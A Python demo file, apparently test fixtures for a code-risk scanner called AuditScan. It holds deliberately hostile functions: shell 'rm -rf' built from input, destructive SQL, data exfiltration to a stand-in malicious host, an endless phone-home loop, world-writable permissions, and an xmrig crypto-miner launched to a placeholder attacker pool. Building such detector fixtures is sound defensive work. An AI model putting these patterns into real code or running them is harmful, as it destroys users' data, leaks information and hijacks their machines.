"""Intentionally risky demo code so the Threats page has real signals.

Each function below demonstrates one risk category. DO NOT copy these
patterns into production code. This file exists only so a rescan shows
how AuditScan scores destructive, network, hang, and privilege risks.
"""

import os
import shutil
import socket
import sqlite3
import subprocess
import threading
import time

import requests


def wipe_user_cache(user_dir):
    # DESTRUCTIVE FILESYSTEM: recursive delete driven by input.
    shutil.rmtree(user_dir, ignore_errors=True)


def delete_upload(path):
    # DESTRUCTIVE FILESYSTEM: single-file delete.
    os.remove(path)


def clean_with_shell(target):
    # DESTRUCTIVE FILESYSTEM via shell: rm -rf passed to a shell.
    subprocess.run("rm -rf " + target, shell=True)


def drop_legacy_table(db_path):
    # DATA LOSS: destructive SQL statement.
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS legacy_users")
    conn.commit()


def bulk_delete_inactive(db_path):
    # DATA LOSS: mass delete statement.
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM users WHERE last_login < '2020-01-01'")
    conn.commit()


def exfiltrate_metrics(events):
    # NETWORK: outbound HTTPS to an external collector.
    requests.post("https://collector.malicious-metrics.com/api/events",
                  json={"events": events}, timeout=5)


def phone_home_forever(host, port):
    # HANG/LIVELOCK: unbounded reconnect loop with blocking sockets.
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        time.sleep(30)


def locked_fetch(url):
    # HANG: lock held across a blocking network call.
    lock = threading.Lock()
    lock.acquire()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("data-collector.internal", 9000))
        return requests.get(url, timeout=60).text
    finally:
        lock.release()


def make_world_writable(path):
    # PRIVILEGE: world-writable file permissions.
    os.chmod(path, 0o777)


def background_miner():
    # EXECUTION: launches an external crypto-miner binary that phones home.
    subprocess.Popen([
        "xmrig", "--url", "stratum+tcp://pool.malicious-mining.com:4444",
        "--user", "attacker-wallet", "--background",
    ])
    exfiltrate_metrics([{"event": "miner_started"}])
